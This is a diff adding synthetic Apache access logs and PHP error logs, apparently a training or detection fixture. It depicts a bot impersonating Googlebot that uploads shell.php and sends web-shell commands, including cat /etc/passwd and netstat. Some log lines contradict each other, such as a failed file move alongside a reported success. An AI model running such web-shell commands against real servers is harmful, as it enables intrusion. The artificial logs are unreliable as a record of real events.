@@ -1,0 +1,26 @@
+192.168.1.100 - - [10/Jan/2024:14:23:15 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+192.168.1.100 - - [10/Jan/2024:14:23:18 +0000] "GET /css/style.css HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+192.168.1.100 - - [10/Jan/2024:14:23:19 +0000] "GET /js/app.js HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+203.0.113.42 - - [10/Jan/2024:14:25:33 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+203.0.113.42 - - [10/Jan/2024:14:25:45 +0000] "GET /login HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+203.0.113.42 - - [10/Jan/2024:14:26:12 +0000] "POST /upload HTTP/1.1" 200 89 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+203.0.113.42 - - [10/Jan/2024:14:26:15 +0000] "GET /uploads/shell.php HTTP/1.1" 200 456 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+203.0.113.42 - - [10/Jan/2024:14:26:18 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 128 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+203.0.113.42 - - [10/Jan/2024:14:26:22 +0000] "GET /uploads/shell.php?cmd=ls+-la HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+203.0.113.42 - - [10/Jan/2024:14:26:28 +0000] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1423 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+203.0.113.42 - - [10/Jan/2024:14:26:35 +0000] "GET /uploads/shell.php?cmd=pwd HTTP/1.1" 200 24 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+203.0.113.42 - - [10/Jan/2024:14:26:42 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 156 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+192.168.1.100 - - [10/Jan/2024:14:27:00 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+203.0.113.42 - - [10/Jan/2024:14:28:15 +0000] "GET /uploads/shell.php?cmd=uname+-a HTTP/1.1" 200 89 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+203.0.113.42 - - [10/Jan/2024:14:28:22 +0000] "GET /uploads/shell.php?cmd=netstat+-tulpn HTTP/1.1" 200 512 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+[10-Jan-2024 14:26:12] PHP Notice:  Undefined index: file in /var/www/html/upload.php on line 15
+[10-Jan-2024 14:26:12] PHP Warning:  move_uploaded_file(): Unable to move '/tmp/phpXyz123' to '/var/www/html/uploads/shell.php' in /var/www/html/upload.php on line 23
+[10-Jan-2024 14:26:12] PHP Notice:  File uploaded successfully: shell.php in /var/www/html/upload.php on line 28
+[10-Jan-2024 14:26:15] PHP Warning:  system(): Unable to fork [whoami] in /var/www/html/uploads/shell.php on line 12
+[10-Jan-2024 14:26:18] PHP Warning:  system(): Unable to fork [whoami] in /var/www/html/uploads/shell.php on line 12
+[10-Jan-2024 14:26:22] PHP Warning:  system(): Unable to fork [ls -la] in /var/www/html/uploads/shell.php on line 12
+[10-Jan-2024 14:26:28] PHP Warning:  system(): Unable to fork [cat /etc/passwd] in /var/www/html/uploads/shell.php on line 12
+[10-Jan-2024 14:26:35] PHP Warning:  system(): Unable to fork [pwd] in /var/www/html/uploads/shell.php on line 12
+[10-Jan-2024 14:26:42] PHP Warning:  system(): Unable to fork [id] in /var/www/html/uploads/shell.php on line 12
+[10-Jan-2024 14:28:15] PHP Warning:  system(): Unable to fork [uname -a] in /var/www/html/uploads/shell.php on line 12
+[10-Jan-2024 14:28:22] PHP Warning:  system(): Unable to fork [netstat -tulpn] in /var/www/html/uploads/shell.php on line 12
